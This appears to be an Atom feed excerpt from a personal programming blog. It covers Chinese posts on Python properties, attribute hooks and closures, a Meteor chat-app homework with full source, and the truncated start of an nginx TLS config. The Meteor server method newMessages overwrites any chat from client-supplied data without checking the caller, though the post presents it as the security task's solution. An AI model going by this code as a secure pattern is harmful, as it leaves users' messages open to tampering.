    <content type="html"><![CDATA[<h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>property([fget[, fset[, fdel[, doc]]]])<br>property()函数前面三个参数分别对应于数据描述符的中的__get__，__set__，__del__方法，所以它们之间会有一个内部的与数据描述符的映射。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">class C(object):</div><div class="line">    def __init__(self):</div><div class="line">        self._x = None</div><div class="line"></div><div class="line">    def getx(self):</div><div class="line">        return self._x</div><div class="line">    def setx(self, value):</div><div class="line">        self._x = value</div><div class="line">    def delx(self):</div><div class="line">        del self._x</div><div class="line">    x = property(getx, setx, delx, &quot;I&apos;m the &apos;x&apos; property.&quot;)</div></pre></td></tr></table></figure>
<h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><p>通常可以用__getattr__(self, name)来查询即时生成的属性。当我们查询一个属性时，如果无法通过__dict__找到该属性，那么Python会调用对象的__getattr__方法，来即时生成。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">class Rectangle(object):</div><div class="line">    def __init__(self, width=0, height=0):</div><div class="line">        self.width = width</div><div class="line">        self.height = height</div><div class="line"></div><div class="line">    def __setattr__(self, name, value):</div><div class="line">        if name == &apos;area&apos;:</div><div class="line">            raise Exception(&apos;area can not be set. Please set the area by set width and height.&apos;)</div><div class="line">        else:</div><div class="line">            self.__dict__[name] = value</div><div class="line"></div><div class="line">    def __getattr__(self, name):</div><div class="line">        if name == &apos;area&apos;:</div><div class="line">            return self.width*self.height</div><div class="line">        else:</div><div class="line">            raise AttributeError</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    rt = Rectangle(5, 6)</div><div class="line">    print rt.area</div><div class="line">    rt.width, rt.height = 3, 4</div><div class="line">    print rt.area</div><div class="line">    rt.area = 100</div></pre></td></tr></table></figure>
<p>__getattr__可以将所有的即时生成属性放在同一个函数中处理。__getattr__可以根据函数名区别处理不同的属性。</p>
<p>Python中还有一个__getattribute__特殊方法，用于查询任意属性。__getattr__只能用来查询不在__dict__系统中的属性<br>__setattr__(self, name, value)和__delattr__(self, name)可用于修改和删除属性。它们的应用面更广，可用于任意属性</p>
<p>参考<br><a href="https://docs.python.org/release/2.6/library/functions.html#property" target="_blank" rel="external">python doc</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h4&gt;&lt;p&gt;property([fget[, fset[, fdel[, doc]]]])&lt;br&gt;property()函数前面三个参数分别对应于数据描述
    
    </summary>
    
    
      <category term="property python" scheme="https://t1ger.github.io/tags/property-python/"/>
    
  </entry>
  
  <entry>
    <title>python闭包的理解</title>
    <link href="https://t1ger.github.io/2016/10/25/python%E9%97%AD%E5%8C%85%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <id>https://t1ger.github.io/2016/10/25/python闭包的理解/</id>
    <published>2016-10-25T11:05:27.000Z</published>
    <updated>2016-10-26T03:56:59.242Z</updated>
    
    <content type="html"><![CDATA[<h4 id="什么是闭包"><a href="#什么是闭包" class="headerlink" title="什么是闭包"></a>什么是闭包</h4><p>维基上的解释:<br>在计算机科学中，闭包（Closure）是词法闭包（Lexical Closure）的简称，是引用了自由变量的函数。这个被引用的自由变量将和这个函数一同存在，即使已经离开了创造它的环境也不例外。所以，有另一种说法认为闭包是由函数和与其相关的引用环境组合而成的实体。闭包在运行时可以有多个实例，不同的引用环境和相同的函数组合可以产生不同的实例。</p>
<p>假如用一句话来理解这段话：函数内在包含子函数，并最终return子函数</p>
<p>举个栗子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">def parent(name):</div><div class="line">    def child(age):</div><div class="line">        print &apos;name:&apos;, name, &apos;age:&apos;, age</div><div class="line">    return child</div><div class="line"></div><div class="line">who = parent(&apos;tomcat&apos;)</div><div class="line">who(26)  # &gt;&gt;&gt; name: tomcat age: 26</div></pre></td></tr></table></figure>
<p>在调用parent的时候就产生了一个闭包–child,该闭包持有自由变量–name.即当函数parent的生命周期结束后，name的变量依然存在。因为它被闭包引用了，所以不会被回收。</p>
<h4 id="闭包的应用"><a href="#闭包的应用" class="headerlink" title="闭包的应用"></a>闭包的应用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">def decorator_func(func):</div><div class="line">    def wrapper(*args, **kwargs):</div><div class="line">        return func(*args, **kwargs)</div><div class="line">    return wrapper</div><div class="line">	</div><div class="line">@decorator_func</div><div class="line">def func(name):</div><div class="line">    print &apos;my name is&apos;, name</div><div class="line">	</div><div class="line">#等价于</div><div class="line">decorator_func(func)</div></pre></td></tr></table></figure>
<p>在这个例子中，闭包(wrapper)有外部的func这个参数，并且能接收外部传来的参数，并将参数传递给func,返回执行结果</p>
<h4 id="总结-在Python中创建一个闭包可以归结为以下三点"><a href="#总结-在Python中创建一个闭包可以归结为以下三点" class="headerlink" title="总结,在Python中创建一个闭包可以归结为以下三点:"></a>总结,在Python中创建一个闭包可以归结为以下三点:</h4><ul>
<li>闭包函数必须有内嵌函数</li>
<li>内嵌函数需要引用该嵌套函数上一级namespace中的变量</li>
<li>闭包函数必须返回内嵌函数</li>
</ul>
<p>参考</p>
<p><a href="http://www.cnblogs.com/vamei/archive/2012/12/15/2772451.html" target="_blank" rel="external">python 深入闭包</a><br><a href="https://www.the5fire.com/closure-in-python.html" target="_blank" rel="external">python 中的闭包</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;什么是闭包&quot;&gt;&lt;a href=&quot;#什么是闭包&quot; class=&quot;headerlink&quot; title=&quot;什么是闭包&quot;&gt;&lt;/a&gt;什么是闭包&lt;/h4&gt;&lt;p&gt;维基上的解释:&lt;br&gt;在计算机科学中，闭包（Closure）是词法闭包（Lexical Closure）的简称，是引
    
    </summary>
    
    
      <category term="Closure python" scheme="https://t1ger.github.io/tags/Closure-python/"/>
    
  </entry>
  
  <entry>
    <title>Meteor Tutorial: Build chat Web Applications with Meteor</title>
    <link href="https://t1ger.github.io/2016/10/17/Meteor-Tutorial-Build-chat-Web-Applications-with-Meteor/"/>
    <id>https://t1ger.github.io/2016/10/17/Meteor-Tutorial-Build-chat-Web-Applications-with-Meteor/</id>
    <published>2016-10-17T03:46:53.000Z</published>
    <updated>2016-10-17T03:21:31.707Z</updated>
    
    <content type="html"><![CDATA[<p>let’s spent a little time to explain the assessment.first,this is my homework about meteor on coursera.I have to complete three task below</p>
<p>You should download and run the starter application, then test it out by logging in as different users in two different web browsers at the same time, seeing if the users if the users can talk to each other. It creates a set of test user accounts automatically, so you can log in as user1@test.com … user8@test.com with the password test123.</p>
<p>Task 1: Improve the look and feel</p>
<p>Adapt the templates and helper functions so that the messaging window displays users’ avatars next to their messages. Feel free to add other enhancements!</p>
<p>Task 2: Implement data writing security</p>
<p>Remove the insecure package from the application and implement a Meteor method to allow the insertion of chat items in the Chats collection. Test that you cannot insert items directly any more.</p>
<p>Task 3: Implement data reading security</p>
<p>Remove the autopublish package from the application and implement publish and subscribe for Chats. Users should only be able to retrieve chats that have their user id in either the user1Id field or the user2Id field. Test by logging in as different users and checking what you can see</p>
<p>Challenge: Implement emoticons</p>
<p>Can you implement emoticon functionality which allows the user to insert graphical emoticons into their message? Emoticons are small icons such as smiley faces which are typical of this kind of application.</p>
<p>this is html file: minstant.html</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div></pre></td><td class="code"><pre><div class="line">&lt;head&gt;</div><div class="line">  &lt;title&gt;minstant&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line">&lt;/body&gt;</div><div class="line"></div><div class="line">&lt;!-- this is the main template used by iron:router to build the page --&gt;</div><div class="line">&lt;template name=&quot;ApplicationLayout&quot;&gt;</div><div class="line">	&#123;&#123;&gt; yield &quot;header&quot;&#125;&#125;</div><div class="line">	</div><div class="line">	&lt;div class=&quot;container&quot;&gt;</div><div class="line">	&#123;&#123;&gt; yield &quot;main&quot;&#125;&#125;</div><div class="line">	&lt;/div&gt;</div><div class="line">&lt;/template&gt;</div><div class="line"></div><div class="line">&lt;!-- top level template for the nav bar --&gt;</div><div class="line">&lt;template name=&quot;navbar&quot;&gt;</div><div class="line">&lt;nav class=&quot;navbar navbar-default&quot;&gt;</div><div class="line">  &lt;div class=&quot;container-fluid&quot;&gt;</div><div class="line">    &lt;div class=&quot;navbar-header&quot;&gt;</div><div class="line">      &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;</div><div class="line">        Minstant!</div><div class="line">      &lt;/a&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    &lt;div class=&quot;nav navbar-nav&quot;&gt;</div><div class="line">    &#123;&#123;&gt; loginButtons&#125;&#125;</div><div class="line">&lt;/div&gt;</div><div class="line">  &lt;/div&gt;</div><div class="line">&lt;/nav&gt;</div><div class="line">&lt;/template&gt;</div><div class="line"></div><div class="line">&lt;!-- Top level template for the lobby page --&gt;</div><div class="line">&lt;template name=&quot;lobby_page&quot;&gt;</div><div class="line">	&#123;&#123;&gt; available_user_list&#125;&#125;</div><div class="line">&lt;/template&gt;</div><div class="line"></div><div class="line">&lt;!-- display a list of users --&gt;</div><div class="line">&lt;template name=&quot;available_user_list&quot;&gt;</div><div class="line">	&lt;h2&gt;Choose someone to chat with:&lt;/h2&gt;</div><div class="line">	&lt;div class=&quot;row&quot;&gt;</div><div class="line">	&#123;&#123;#each users&#125;&#125;</div><div class="line">	&#123;&#123;&gt; available_user&#125;&#125;</div><div class="line">	&#123;&#123;/each&#125;&#125;</div><div class="line">&lt;/div&gt;</div><div class="line">&lt;/template&gt;</div><div class="line"></div><div class="line">&lt;!-- display an individual user --&gt;</div><div class="line">&lt;template name=&quot;available_user&quot;&gt;</div><div class="line">	&lt;div class=&quot;col-md-2&quot;&gt;</div><div class="line">		&lt;div class=&quot;user_avatar&quot;&gt;</div><div class="line">			&#123;&#123;#if isMyUser _id&#125;&#125; </div><div class="line">			&lt;div class=&quot;bg-success&quot;&gt;&#123;&#123;getUsername _id&#125;&#125; (YOU)</div><div class="line">				&lt;br/&gt;</div><div class="line">				&lt;img src=&quot;/&#123;&#123;profile.avatar&#125;&#125;&quot; class=&quot;avatar_img&quot;&gt;			</div><div class="line">			&lt;/div&gt;</div><div class="line">			&#123;&#123;else&#125;&#125;</div><div class="line">			&lt;a href=&quot;/chat/&#123;&#123;_id&#125;&#125;&quot;&gt;</div><div class="line">				&#123;&#123;getUsername _id&#125;&#125;</div><div class="line">				&lt;br/&gt;</div><div class="line">				&lt;img src=&quot;/&#123;&#123;profile.avatar&#125;&#125;&quot; class=&quot;avatar_img&quot;&gt;</div><div class="line">			&lt;/a&gt;</div><div class="line">			&#123;&#123;/if&#125;&#125;</div><div class="line">		&lt;/div&gt;</div><div class="line">	&lt;/div&gt;</div><div class="line">&lt;/template&gt;</div><div class="line"></div><div class="line">&lt;!-- display an individual user avatar --&gt;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">&lt;!-- Top level template for the chat page --&gt;</div><div class="line">&lt;template name=&quot;chat_page&quot;&gt;</div><div class="line">	&lt;h2&gt;Type in the box below to send a message!&lt;/h2&gt;</div><div class="line">	&lt;div class=&quot;row&quot;&gt;</div><div class="line">		&lt;div class=&quot;col-md-12&quot;&gt;</div><div class="line">			&lt;div class=&quot;well well-lg&quot;&gt;</div><div class="line">			&#123;&#123;#each messages&#125;&#125;</div><div class="line"></div><div class="line">			&#123;&#123;&gt; chat_message&#125;&#125;</div><div class="line">			&#123;&#123;/each&#125;&#125;</div><div class="line">			&lt;/div&gt;	</div><div class="line">		&lt;/div&gt;</div><div class="line">	&lt;/div&gt;</div><div class="line">    &lt;div class=&quot;row&quot;&gt;</div><div class="line">		&lt;div class=&quot;col-md-12&quot;&gt;</div><div class="line">			&lt;form class=&quot;js-send-chat&quot;&gt;</div><div class="line">			&lt;input class=&quot;input&quot; type=&quot;text&quot; name=&quot;chat&quot; placeholder=&quot;type a message here...&quot;&gt;</div><div class="line">			&lt;button class=&quot;btn btn-default&quot;&gt;send&lt;/button&gt;</div><div class="line">		&lt;/form&gt;</div><div class="line">		&lt;/div&gt;</div><div class="line">	&lt;/div&gt;</div><div class="line">&lt;/template&gt;</div><div class="line"></div><div class="line">&lt;!-- simple template that displays a message --&gt;</div><div class="line">&lt;template name=&quot;chat_message&quot;&gt;</div><div class="line">	&#123;&#123;#if currentUser&#125;&#125; </div><div class="line">		&lt;img src=&quot;/&#123;&#123;avatar&#125;&#125;&quot; class=&quot;avatar_img&quot;&gt;&#123;&#123;Username&#125;&#125; said: &#123;&#123;text&#125;&#125;</div><div class="line">	&#123;&#123;else&#125;&#125;</div><div class="line">		someone said &#123;&#123;text&#125;&#125;</div><div class="line">	&#123;&#123;/if&#125;&#125;</div><div class="line">	</div><div class="line">	&lt;br&gt;</div><div class="line">&lt;/template&gt;</div></pre></td></tr></table></figure>
<p>this is css file: minstant.css</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">/* CSS declarations go here */</div><div class="line"></div><div class="line">.user_avatar&#123;</div><div class="line">	min-height:100px;</div><div class="line">	text-align: center;</div><div class="line"></div><div class="line">&#125;</div><div class="line">.avatar_img&#123;</div><div class="line">	height:75px;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>this is js file: minstant.js</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div></pre></td><td class="code"><pre><div class="line">Chats = new Mongo.Collection(&quot;chats&quot;);</div><div class="line"></div><div class="line">if (Meteor.isClient) &#123;</div><div class="line">  // set up the main template the the router will use to build pages</div><div class="line">  Router.configure(&#123;</div><div class="line">    layoutTemplate: &apos;ApplicationLayout&apos;</div><div class="line">  &#125;);</div><div class="line">  // specify the top level route, the page users see when they arrive at the site</div><div class="line">  Router.route(&apos;/&apos;, function () &#123;</div><div class="line">    console.log(&quot;rendering root /&quot;);</div><div class="line">    this.render(&quot;navbar&quot;, &#123;to:&quot;header&quot;&#125;);</div><div class="line">    this.render(&quot;lobby_page&quot;, &#123;to:&quot;main&quot;&#125;);  </div><div class="line">  &#125;);</div><div class="line"></div><div class="line">  // specify a route that allows the current user to chat to another users</div><div class="line">  Router.route(&apos;/chat/:_id&apos;, function () &#123;</div><div class="line">    // the user they want to chat to has id equal to </div><div class="line">    // the id sent in after /chat/... </div><div class="line">    var otherUserId = this.params._id;</div><div class="line">    // find a chat that has two users that match current user id</div><div class="line">    // and the requested user id</div><div class="line">    var filter = &#123;$or:[</div><div class="line">                &#123;user1Id:Meteor.userId(), user2Id:otherUserId&#125;, </div><div class="line">                &#123;user2Id:Meteor.userId(), user1Id:otherUserId&#125;</div><div class="line">                ]&#125;;</div><div class="line">    var chat = Chats.findOne(filter);</div><div class="line">    if (!chat)&#123;// no chat matching the filter - need to insert a new one</div><div class="line">      //chatId = Chats.insert(&#123;user1Id:Meteor.userId(), user2Id:otherUserId&#125;);</div><div class="line">	  chatId = Meteor.call(&quot;createChat&quot;, Meteor.userId(), otherUserId, function (error) &#123;</div><div class="line">      if (error &amp;&amp; error.error === &quot;logged-out&quot;) &#123;</div><div class="line">        // show a nice error message</div><div class="line">        alert(&quot;Please, log in or create an account.&quot;);</div><div class="line">      &#125;</div><div class="line">    &#125;);</div><div class="line">    &#125;</div><div class="line">    else &#123;// there is a chat going already - use that. </div><div class="line">      chatId = chat._id;</div><div class="line">    &#125;</div><div class="line">    if (chatId)&#123;// looking good, save the id to the session</div><div class="line">      Session.set(&quot;chatId&quot;,chatId);</div><div class="line">    &#125;</div><div class="line">    this.render(&quot;navbar&quot;, &#123;to:&quot;header&quot;&#125;);</div><div class="line">    this.render(&quot;chat_page&quot;, &#123;to:&quot;main&quot;&#125;);  </div><div class="line">  &#125;);</div><div class="line">  </div><div class="line">  </div><div class="line">  Meteor.subscribe(&quot;users&quot;);</div><div class="line">  Meteor.subscribe(&quot;chats&quot;);</div><div class="line"></div><div class="line">  ///</div><div class="line">  // helper functions </div><div class="line">  /// </div><div class="line">  Template.available_user_list.helpers(&#123;</div><div class="line">    users:function()&#123;</div><div class="line">      return Meteor.users.find();</div><div class="line">    &#125;</div><div class="line">  &#125;)</div><div class="line"> Template.available_user.helpers(&#123;</div><div class="line">    getUsername:function(userId)&#123;</div><div class="line">      user = Meteor.users.findOne(&#123;_id:userId&#125;);</div><div class="line">      return user.profile.username;</div><div class="line">    &#125;, </div><div class="line">    isMyUser:function(userId)&#123;</div><div class="line">      if (userId == Meteor.userId())&#123;</div><div class="line">        return true;</div><div class="line">      &#125;</div><div class="line">      else &#123;</div><div class="line">        return false;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;)</div><div class="line"></div><div class="line">  Template.chat_page.helpers(&#123;</div><div class="line">    messages:function()&#123;</div><div class="line">      var chat = Chats.findOne(&#123;_id:Session.get(&quot;chatId&quot;)&#125;);</div><div class="line">      return chat.messages;</div><div class="line">    &#125;, </div><div class="line">    other_user:function()&#123;</div><div class="line">      return &quot;&quot;</div><div class="line">    &#125;, </div><div class="line">	</div><div class="line">  &#125;)</div><div class="line">    </div><div class="line"> Template.chat_page.events(&#123;</div><div class="line">  // this event fires when the user sends a message on the chat page</div><div class="line">  &apos;submit .js-send-chat&apos;:function(event)&#123;</div><div class="line">    // stop the form from triggering a page reload</div><div class="line">    event.preventDefault();</div><div class="line">    // see if we can find a chat object in the database</div><div class="line">    // to which we&apos;ll add the message</div><div class="line">    var chat = Chats.findOne(&#123;_id:Session.get(&quot;chatId&quot;)&#125;);</div><div class="line">    if (chat)&#123;// ok - we have a chat to use</div><div class="line">      var msgs = chat.messages; // pull the messages property</div><div class="line">      if (!msgs)&#123;// no messages yet, create a new array</div><div class="line">        msgs = [];</div><div class="line">      &#125;</div><div class="line">      // is a good idea to insert data straight from the form</div><div class="line">      // (i.e. the user) into the database?? certainly not. </div><div class="line">      // push adds the message to the end of the array</div><div class="line">      msgs.push(&#123;text: event.target.chat.value,avatar: Meteor.user().profile.avatar, Username: Meteor.user().profile.username&#125;);</div><div class="line">      // reset the form</div><div class="line">      event.target.chat.value = &quot;&quot;;</div><div class="line">      // put the messages array onto the chat object</div><div class="line">      chat.messages = msgs;</div><div class="line">      // update the chat object in the database.</div><div class="line">	  //Chats.update(chat._id, chat);</div><div class="line">	  Meteor.call(&quot;newMessages&quot;, chat._id, chat);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"> &#125;)</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">// start up script that creates some users for testing</div><div class="line">// users have the username &apos;user1@test.com&apos; .. &apos;user8@test.com&apos;</div><div class="line">// and the password test123 </div><div class="line"></div><div class="line">if (Meteor.isServer) &#123;</div><div class="line">  Meteor.startup(function () &#123;</div><div class="line">    if (!Meteor.users.findOne())&#123;</div><div class="line">      for (var i=1;i&lt;9;i++)&#123;</div><div class="line">        var email = &quot;user&quot;+i+&quot;@test.com&quot;;</div><div class="line">        var username = &quot;user&quot;+i;</div><div class="line">        var avatar = &quot;ava&quot;+i+&quot;.png&quot;</div><div class="line">        console.log(&quot;creating a user with password &apos;test123&apos; and username/ email: &quot;+email);</div><div class="line">        Meteor.users.insert(&#123;profile:&#123;username:username, avatar:avatar&#125;, emails:[&#123;address:email&#125;],services:&#123; password:&#123;&quot;bcrypt&quot; : &quot;$2a$10$I3erQ084OiyILTv8ybtQ4ON6wusgPbMZ6.P33zzSDei.BbDL.Q4EO&quot;&#125;&#125;&#125;);</div><div class="line">      &#125;</div><div class="line">    &#125; </div><div class="line">  &#125;);</div><div class="line">  </div><div class="line">  Meteor.publish(&quot;chats&quot;,function()&#123;</div><div class="line">		return Chats.find(&#123;$or:[</div><div class="line">              &#123;user1Id:this.userId&#125;,</div><div class="line">              &#123;user2Id:this.userId&#125;</div><div class="line">            ]&#125;);</div><div class="line"> &#125;);</div><div class="line"> </div><div class="line"> Meteor.publish(&quot;users&quot;,function()&#123;</div><div class="line">	 return Meteor.users.find();</div><div class="line"> &#125;); </div><div class="line">    </div><div class="line"> Meteor.methods(&#123;</div><div class="line">	  </div><div class="line">  createChat: function (user1, user2) &#123;</div><div class="line">          //Check user logged. If no userID throw a Meteor error</div><div class="line">    if (!this.userId)&#123;</div><div class="line">      throw new Meteor.Error(&quot;logged-out&quot;, &quot;The user must be logged in to post a comment.&quot;);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // start - createChat</div><div class="line">    if (Meteor.users.find(&#123;_id: user1&#125;) &amp;&amp; Meteor.users.find(&#123;_id: user2&#125;)) &#123;</div><div class="line">      Chats.insert(&#123;user1Id:user1, user2Id:user2&#125;, function(err, result)&#123;</div><div class="line">        if (err) &#123;return err;&#125;</div><div class="line">        else &#123;</div><div class="line">          return result;&#125;</div><div class="line">      &#125;);</div><div class="line">    &#125;</div><div class="line">  &#125;, </div><div class="line">    //end - createChat</div><div class="line">  </div><div class="line">	newMessages: function (chatId, messages) &#123;</div><div class="line">    Chats.update(chatId, messages);</div><div class="line">  &#125;</div><div class="line">&#125;) </div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      Meteor tutorial about web Applications
    
    </summary>
    
    
      <category term="meteor nodejs" scheme="https://t1ger.github.io/tags/meteor-nodejs/"/>
    
  </entry>
  
  <entry>
    <title>Security on nginx</title>
    <link href="https://t1ger.github.io/2016/09/28/Security-on-nginx/"/>
    <id>https://t1ger.github.io/2016/09/28/Security-on-nginx/</id>
    <published>2016-09-28T05:01:23.000Z</published>
    <updated>2016-09-28T07:47:58.617Z</updated>
    
    <content type="html"><![CDATA[<p>闲言少续，直接上配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line"> </div><div class="line">  listen [::]:443 default_server;</div><div class="line"> </div><div class="line">  ssl on;</div><div class="line">  ssl_certificate_key /etc/ssl/cert/abc.pem;</div><div class="line">  ssl_certificate /etc/ssl/cert/abc.pem;</div><div class="line"> </div><div class="line">  ssl_ciphers EECDH+ECDSA+AESGCM:EECDH+aRSA+AESGCM:EECDH+ECDSA+SHA512:EECDH+ECDSA+SHA384:EECDH+ECDSA+SHA256:ECDH+AESGCM:ECDH+AES256:DH+AESGCM:DH+AES256:RSA+AESGCM:!aNULL:!eNULL:!LOW:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS</div><div class="line">  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</div><div class="line">  ssl_prefer_server_ciphers 